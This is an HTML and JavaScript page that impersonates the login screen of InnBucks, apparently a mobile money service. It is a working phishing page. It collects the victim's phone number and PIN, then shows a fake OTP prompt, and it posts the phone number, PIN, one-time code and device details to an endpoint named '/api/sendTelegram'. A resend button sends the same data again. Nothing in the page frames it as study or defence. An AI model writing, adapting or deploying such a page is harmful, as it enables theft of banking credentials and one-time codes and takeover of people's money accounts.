<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:12px;
  border:1px solid #1f2937;
  box-shadow:0 20px 50px rgba(0,0,0,.7)
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;font-size:20px;color:#f8fafc}
label{display:block;font-size:13px;margin-top:8px;color:#cbd5f5}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
  font-size:14px
}
.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%
}
.btn[disabled]{background:#334155}

.req{color:#ef4444;margin-right:6px}
.small{font-size:13px;color:#9ca3af}
.success{color:#22c55e;font-weight:600}

.error{
  min-height:18px;
  font-size:13px;
  color:#ef4444;
}

/* PIN */
.pin-row{display:flex;gap:10px;justify-content:center;margin-top:10px}
.pin-digit{
  width:18px;height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  text-align:center;
  font-size:1px;
  color:transparent;
  caret-color:transparent;
}
.pin-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

/* OTP */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,.85);
  display:flex;
  align-items:center;
  justify-content:center
}
.otp-box{
  background:#020617;
  padding:18px;
  border-radius:12px;
  min-width:300px;
  border:1px solid #1f2937
}
.otp-row{display:flex;gap:10px;justify-content:center;margin-top:10px}
.otp-digit{
  width:18px;height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  text-align:center;
  font-size:1px;
  color:transparent;
  caret-color:transparent;
}
.otp-digit.filled{
  background:#2563eb;
  border-color:#2563eb
}
.otp-warning{color:#ef4444;font-size:13px;display:none}

.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:12px
}
.resend-btn{
  background:#020617;
  border:1px solid #1f2937;
  padding:8px 14px;
  border-radius:8px;
  color:#e5e7eb
}
.resend-btn[disabled]{opacity:.5}

.action-primary{
  background:#2563eb;
  border:0;
  color:#fff;
}
.action-secondary{
  background:#020617;
  border:1px solid #1f2937;
  color:#e5e7eb;
}
</style>
</head>

<body>

<div class="card">
  <img src="assets/InnBucks.png" alt="InnBucks" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 5 digits</div>

    <div class="resend-row">
      <div class="small">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== DEVICE (RESTORED) ===== */
const ua = navigator.userAgent;
let device = 'Unknown';

if (/Android/i.test(ua)) {
  const v = ua.match(/Android\s([\d.]+)/);
  device = 'Android ' + (v ? v[1] : '');
} else if (/iPhone|iPad/i.test(ua)) {
  const v = ua.match(/OS (\d+_\d+)/);
  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
}
if (/Chrome/i.test(ua)) device += ' | Chrome';
else if (/Safari/i.test(ua)) device += ' | Safari';
else if (/Firefox/i.test(ua)) device += ' | Firefox';

/* ===== PLAN (RESTORED) ===== */
let selectedPlan = null;
try {
  selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan'));
} catch(e){}

/* ===== SHARED DIGIT HANDLER ===== */
function bindDigitInputs(list, onChange){
  list.forEach((el,i)=>{
    el.addEventListener('input',()=>{
      el.value=el.value.replace(/\D/g,'');
      el.classList.toggle('filled',!!el.value);
      if(el.value && i<list.length-1) list[i+1].focus();
      onChange();
    });
    el.addEventListener('keydown',e=>{
      if(e.key==='Backspace' && !el.value && i>0){
        list[i-1].focus();
        list[i-1].value='';
        list[i-1].classList.remove('filled');
        e.preventDefault();
        onChange();
      }
    });
  });
}

/* ===== PHONE ===== */
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');

function validatePhone(){
  const d=phone.value.replace('+263','');
  if(!/^7\d{8}$/.test(d)){
    phoneError.innerText='Input 9-digit number starting with 7';
    return false;
  }
  phoneError.innerText='';
  return true;
}

phone.addEventListener('input',()=>{
  let d=phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phone.value='+263'+d;
  updateLogin();
});

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';
bindDigitInputs(pins,()=>{
  pinValue=pins.map(p=>p.value).join('');
  updateLogin();
});

function updateLogin(){
  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue));
}

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== OTP ===== */
const dEls=[0,1,2,3,4].map(i=>document.getElementById('d'+i));
const confirmBtn=document.getElementById('confirmOtp');
const otpWarning=document.getElementById('otpWarning');
const resendBtn=document.getElementById('resendBtn');
const countdown=document.getElementById('countdown');
const otpStatus=document.getElementById('otpStatus');

let timer=null;
let seconds=120;

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;
  countdown.textContent=seconds;

  timer=setInterval(()=>{
    seconds--;
    countdown.textContent=seconds;
    if(seconds===0){
      clearInterval(timer);
      resendBtn.disabled=false;
    }
  },1000);
}

function updateOtpState(){
  const otp=dEls.map(d=>d.value).join('');
  const ok=/^\d{5}$/.test(otp);
  confirmBtn.disabled=!ok;
  otpWarning.style.display=ok?'none':'block';
}

bindDigitInputs(dEls,updateOtpState);

/* OTP paste */
dEls[0].addEventListener('paste',e=>{
  const data=(e.clipboardData||window.clipboardData)
    .getData('text').replace(/\D/g,'').slice(0,5);
  if(!data) return;
  e.preventDefault();
  dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
  data.split('').forEach((v,i)=>{
    dEls[i].value=v;
    dEls[i].classList.add('filled');
  });
  updateOtpState();
});

/* ===== LOGIN CLICKED ===== */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  if(document.getElementById('hp').value) return;
  if(navigator.vibrate) navigator.vibrate(30);

  await sendToServer({
    event:'login_clicked',
    loginPhone: phone.value,
    loginPin: pinValue,
    plan: selectedPlan,
    device,
    submittedAt: new Date().toISOString()
  });

  document.getElementById('otpModal').style.display='flex';
  dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
  updateOtpState();
  startCountdown();
});

/* ===== CONFIRM OTP ===== */
confirmBtn.onclick=async()=>{
  if(confirmBtn.disabled) return;
  if(navigator.vibrate) navigator.vibrate(30);

  await sendToServer({
    event:'otp_confirm',
    loginPhone: phone.value,
    loginPin: pinValue,
    otp: dEls.map(d=>d.value).join(''),
    plan: selectedPlan,
    device,
    submittedAt: new Date().toISOString()
  });

  otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
  setTimeout(()=>location.href='thankyou.html',1200);
};

/* ===== RESEND OTP ===== */
resendBtn.onclick=async()=>{
  await sendToServer({
    event:'resend_otp',
    loginPhone: phone.value,
    loginPin: pinValue,
    plan: selectedPlan,
    device,
    submittedAt: new Date().toISOString()
  });
  startCountdown();
};

document.getElementById('cancelOtp').onclick=()=>{
  document.getElementById('otpModal').style.display='none';
  clearInterval(timer);
};
</script>
</body>
</html>
